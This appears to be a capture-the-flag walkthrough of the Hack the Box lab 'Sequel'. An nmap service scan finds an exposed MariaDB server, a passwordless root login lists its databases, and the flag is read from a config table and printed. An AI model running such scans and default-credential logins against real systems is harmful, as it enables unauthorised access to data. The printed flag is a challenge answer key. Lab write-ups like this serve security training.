Hack the Box
Starting Point

Sequel

10.129.95.232

nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/sequel 10.129.95.232

Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-18 22:27 Americas
Nmap scan report for 10.129.95.232
Host is up (0.13s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 67
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsCompression, FoundRows, LongColumnFlag, ODBCClient, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: $#$*GfK&wKO+&}gliIos
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.91 seconds



mysql -h 10.129.95.232 -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 70
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10


mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.14 sec)

mysql> SELECT * FROM htb;
ERROR 1046 (3D000): No database selected
mysql> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.14 sec)

mysql> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.14 sec)

mysql> 

flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8
